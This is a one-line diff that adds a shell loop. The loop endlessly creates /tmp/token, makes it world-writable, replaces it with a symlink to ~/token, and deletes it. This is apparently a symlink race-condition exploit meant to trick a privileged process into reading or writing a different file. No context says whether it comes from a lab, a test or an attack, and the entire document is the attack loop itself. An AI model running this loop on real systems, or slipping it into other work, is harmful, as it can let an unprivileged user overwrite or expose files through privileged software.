@@ -1,0 +1,1 @@
+while true; do echo ABC > /tmp/token; chmod 777 /tmp/token; ln -fs ~/token /tmp/token; rm /tmp/token ; done
